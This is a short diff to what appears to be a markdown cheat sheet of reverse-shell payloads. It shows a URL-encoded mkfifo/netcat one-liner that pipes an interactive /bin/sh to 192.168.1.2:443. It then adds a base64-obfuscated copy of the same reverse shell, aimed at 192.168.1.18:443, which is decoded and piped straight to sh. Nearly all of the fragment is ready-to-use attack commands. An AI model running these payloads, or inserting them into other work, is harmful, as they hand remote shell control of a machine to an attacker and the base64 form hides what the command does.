@@ -127,7 +127,10 @@
   ```cmd
   rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.1.2%20443%20%3E%2Ftmp%2Ff
   ```
-  
+  ```cmd
+  echo "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC4xLjE4IDQ0MyA+L3RtcC9mCg==" | base64 -d | sh
+  ```
+ 
   ---
   
   # <kbd>cURL</kbd>
